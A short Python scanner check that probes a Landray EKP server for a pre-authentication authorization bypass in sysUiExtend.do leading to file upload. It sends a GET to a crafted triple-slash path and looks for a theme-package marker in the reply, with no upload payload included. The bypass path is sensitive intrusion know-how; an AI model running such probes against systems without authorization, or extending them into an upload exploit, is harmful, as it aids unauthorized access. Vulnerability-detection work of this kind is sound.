import requests
import urllib

def verify(url):
    relsult = {
        'name': '可能存在：蓝凌EKP sysUiExtend.do前台授权绕过导致文件上传',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Connection':'close'
    }
    vurl = urllib.parse.urljoin(url, "/api///sys/ui/sys_ui_extend/sysUiExtend.do?method=upload")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200 and '主题包' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult